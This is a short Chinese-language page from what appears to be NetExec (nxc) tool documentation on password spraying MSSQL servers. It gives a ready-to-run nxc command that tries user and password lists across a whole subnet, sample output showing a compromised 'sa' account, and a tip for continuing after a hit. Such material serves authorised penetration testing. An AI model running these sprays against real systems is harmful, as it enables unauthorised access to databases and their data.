# 密码喷洒攻击

#### 密码喷洒攻击（不使用暴力破解）

```
#~ nxc mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

预期结果:

```
MSSQL       10.10.10.59     1433   None             [-] ERROR(TALLY): Line 1: Login failed for user 'test1'.
MSSQL       10.10.10.59     1433   None             [+] sa:password (Pwn3d!)
```

{% hint style="info" %}
默认情况下,nxc 会在找到一个有效登录后退出。使用 `--continue-on-success` 标志会在找到有效密码后继续喷洒。这在对大量用户列表使用单个密码进行喷洒时很有用。
{% endhint %}
